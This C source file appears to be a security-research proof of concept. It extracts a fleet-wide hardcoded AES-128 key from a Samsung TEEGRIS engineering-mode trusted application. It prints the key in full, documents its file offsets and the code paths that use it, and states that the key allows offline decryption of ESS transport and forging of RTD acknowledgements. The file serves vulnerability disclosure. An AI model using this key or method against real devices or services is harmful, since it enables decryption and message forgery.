/*
 * engmod_wbkey — hardcoded white-box AES key recovery from the engmod TA.  HIGH.
 *
 * UUID 00000000-0000-0000-0000-656e676d6f64  (ASCII tail "engmod").
 *
 * Finding (RE/samsung_teegris/engmod.md "NEW FINDING — HIGH: White-box AES
 * uses a HARDCODED 16-byte ASCII key", confirmed in emulation/engmod.md
 * Finding #1):
 *
 *   The "white-box" AES routines em_wb_aes_ctr_crypt_a @ 0x26E94 (mode 1) and
 *   em_wb_aes_ctr_crypt_b @ 0x27074 (mode 2) do, in the Hex-Rays decompile:
 *       key_const = xmmword_8590;                       // the 16 .rodata bytes
 *       em_aes_key_expand(round_keys_buf, &key_const);  // AES-128 key schedule
 *   i.e. a literal 16-byte ASCII string is loaded DIRECTLY as the AES-128 key.
 *   The wrapper em_wb_aes_state_init @ 0x267B8 only does an RC4-style sbox
 *   shuffle + XOR integrity check; it does NOT derive or protect the key.
 *
 *   The 16 key bytes (RE binary, file offset 0x8590; emulator S9BYH2 build,
 *   file offset 0x8520 per emulation/engmod.md):
 *       64 65 70 61 72 74 6d 73 74 67 67 72 6f 75 70 2e  =  "departmstggroup."
 *
 *   Usage (both with this same constant key):
 *     - em_ess_encrypt_message @ 0x2299C wraps each per-call random
 *       AES-256-CTR ESS session key + IV before base64-sending to Samsung's
 *       ESS server  -> offline decryption of all ESS transport.
 *     - em_cmd_time_check @ 0x1ED2C (cmd 24) uses it to decrypt the inbound
 *       RTD nonce and encrypt the outbound 64-byte RTD ACK -> forgeable ACK.
 *
 *   It is a fleet-wide literal: a brandable ASCII string rules out any
 *   per-device / per-batch derivation; present plaintext in EVERY S921B /
 *   A556B engmod image in the corpus.
 *
 * This is a KEY-RECOVERY PoC. It needs NO TEE runtime: the defect is "a
 * fleet-wide symmetric key ships in plaintext", so reading it out of the
 * binary IS the proof. This program:
 *   (a) opens the engmod TA binary,
 *   (b) reads the 16 key bytes — by SCANNING for the documented ASCII (robust
 *       across the per-build offset shift) and cross-checking the documented
 *       per-build file offset,
 *   (c) prints the key (hex + ASCII),
 *   (d) demonstrates key usability with an AES-128 round-trip in CTR mode
 *       (the wrapper's stream-cipher usage), via OpenSSL EVP — the same
 *       crypto stack the TA links.
 *
 * NOTE on AES key SIZE — grounded, not assumed:
 *   The hardcoded key here is 16 bytes and is loaded into the AES-128 key
 *   schedule (em_aes_key_expand on a 16-byte string) per the decompile. This
 *   is DISTINCT from engmod's other crypto: the KDF labels
 *   "EngineeringMode20 AES256 Key Context, MSTG." + EVP_aes_256_ctr drive a
 *   per-call random AES-256 session key derived via TEES_DeriveKeyKDF — NOT
 *   this constant. We therefore demonstrate AES-128-CTR with the recovered
 *   16-byte key, matching the white-box wrapper.
 *
 * Build:  gcc -O2 wbkey_extract.c -o wbkey_extract -lcrypto
 * Run:    ./wbkey_extract [path-to-engmod.ta-or-.elf]
 *         (defaults to the bundled emulator .ta)
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <openssl/evp.h>

/* Documented key (RE/samsung_teegris/engmod.md "Verified evidence"). */
static const unsigned char EXPECTED_KEY[16] = {
    0x64,0x65,0x70,0x61,0x72,0x74,0x6d,0x73,
    0x74,0x67,0x67,0x72,0x6f,0x75,0x70,0x2e   /* "departmstggroup." */
};
#define KEY_LEN 16

/* Documented per-build FILE offsets, for cross-checking the scan result. */
struct known_off { const char* tag; long off; };
static const struct known_off KNOWN_OFFS[] = {
    { "emulator S9BYH2 .ta (emulation/engmod.md)", 0x8520 },
    { "RE S921B SFDZE1 .elf (engmod.md)",          0x8590 },
    { "RE A556B DZE4 .elf (separate build)",       0x8550 },
};

static const char* DEFAULT_PATH =
    "/home/lamb/opt/TA_GP_emulator/teegris/tas/00000000-0000-0000-0000-656e676d6f64.ta";

static unsigned char* read_file(const char* path, long* out_len)
{
    FILE* f = fopen(path, "rb");
    if (!f) { fprintf(stderr, "[wbkey] cannot open %s\n", path); return NULL; }
    fseek(f, 0, SEEK_END);
    long len = ftell(f);
    fseek(f, 0, SEEK_SET);
    if (len <= 0) { fclose(f); return NULL; }
    unsigned char* buf = malloc((size_t)len);
    if (!buf) { fclose(f); return NULL; }
    if (fread(buf, 1, (size_t)len, f) != (size_t)len) { free(buf); fclose(f); return NULL; }
    fclose(f);
    *out_len = len;
    return buf;
}

/* Find the 16 documented key bytes; returns file offset or -1. */
static long find_key(const unsigned char* buf, long len)
{
    for (long i = 0; i + KEY_LEN <= len; i++)
        if (memcmp(buf + i, EXPECTED_KEY, KEY_LEN) == 0)
            return i;
    return -1;
}

static void print_hex_ascii(const unsigned char* k, int n)
{
    printf("    hex   : ");
    for (int i = 0; i < n; i++) printf("%02x ", k[i]);
    printf("\n    ascii : \"");
    for (int i = 0; i < n; i++) putchar((k[i] >= 0x20 && k[i] <= 0x7e) ? k[i] : '.');
    printf("\"\n");
}

/* AES-128-CTR round-trip with OpenSSL EVP (the TA's own crypto stack).
 * Mirrors the white-box wrapper's stream-cipher usage; proves the recovered
 * 16-byte literal is a usable AES-128 key. Returns 0 on success. */
static int aes128_ctr_roundtrip(const unsigned char* key)
{
    /* A fixed 16-byte counter/IV; CTR is a keystream cipher so enc==dec op. */
    unsigned char iv[16];
    for (int i = 0; i < 16; i++) iv[i] = (unsigned char)i;

    const char* msg = "engmod RTD ACK sample plaintext (key-usability proof)";
    int   ptlen  = (int)strlen(msg);
    unsigned char ct[128] = {0}, rt[128] = {0};
    int len = 0, total = 0;

    EVP_CIPHER_CTX* c = EVP_CIPHER_CTX_new();
    if (!c) return 1;

    /* ---- encrypt ---- */
    if (EVP_EncryptInit_ex(c, EVP_aes_128_ctr(), NULL, key, iv) != 1) goto fail;
    if (EVP_EncryptUpdate(c, ct, &len, (const unsigned char*)msg, ptlen) != 1) goto fail;
    total = len;
    if (EVP_EncryptFinal_ex(c, ct + total, &len) != 1) goto fail;
    total += len;
    int ctlen = total;

    /* ---- decrypt ---- */
    EVP_CIPHER_CTX_reset(c);
    if (EVP_DecryptInit_ex(c, EVP_aes_128_ctr(), NULL, key, iv) != 1) goto fail;
    if (EVP_DecryptUpdate(c, rt, &len, ct, ctlen) != 1) goto fail;
    total = len;
    if (EVP_DecryptFinal_ex(c, rt + total, &len) != 1) goto fail;
    total += len;
    EVP_CIPHER_CTX_free(c);

    printf("    plaintext : \"%s\" (%d bytes)\n", msg, ptlen);
    printf("    ciphertext: ");
    for (int i = 0; i < ctlen; i++) printf("%02x", ct[i]);
    printf("\n    decrypted : \"%.*s\" (%d bytes)\n", total, rt, total);
    if (total == ptlen && memcmp(rt, msg, ptlen) == 0) {
        printf("    [OK] AES-128-CTR round-trip matches -> recovered key is usable.\n");
        return 0;
    }
    printf("    [FAIL] round-trip mismatch.\n");
    return 1;
fail:
    EVP_CIPHER_CTX_free(c);
    fprintf(stderr, "    [FAIL] OpenSSL EVP error during round-trip.\n");
    return 1;
}

int main(int argc, char** argv)
{
    const char* path = (argc > 1) ? argv[1] : DEFAULT_PATH;
    printf("[wbkey] engmod hardcoded white-box AES key recovery\n");
    printf("[wbkey] target binary: %s\n", path);

    long len = 0;
    unsigned char* buf = read_file(path, &len);
    if (!buf) return 1;
    printf("[wbkey] size: %ld bytes\n\n", len);

    long off = find_key(buf, len);
    if (off < 0) {
        fprintf(stderr, "[wbkey] documented key bytes NOT FOUND in this binary.\n");
        free(buf);
        return 1;
    }

    printf("[wbkey] KEY RECOVERED at file offset 0x%lx:\n", off);
    print_hex_ascii(buf + off, KEY_LEN);

    /* Cross-check against the documented per-build offsets. */
    const char* matched = NULL;
    for (size_t i = 0; i < sizeof(KNOWN_OFFS)/sizeof(KNOWN_OFFS[0]); i++)
        if (KNOWN_OFFS[i].off == off) { matched = KNOWN_OFFS[i].tag; break; }
    if (matched)
        printf("[wbkey] offset 0x%lx matches documented build: %s\n", off, matched);
    else
        printf("[wbkey] offset 0x%lx not in the documented set (new/relocated build);"
               " bytes still match the documented key.\n", off);

    /* Confirm byte-for-byte equality with the writeup's recorded value. */
    if (memcmp(buf + off, EXPECTED_KEY, KEY_LEN) == 0)
        printf("[wbkey] bytes are BYTE-FOR-BYTE identical to the RE writeup's"
               " \"departmstggroup.\" .\n\n");

    printf("[wbkey] key-usability demo (AES-128-CTR, OpenSSL EVP = the TA's"
           " crypto stack):\n");
    int rc = aes128_ctr_roundtrip(buf + off);

    free(buf);
    return rc;
}
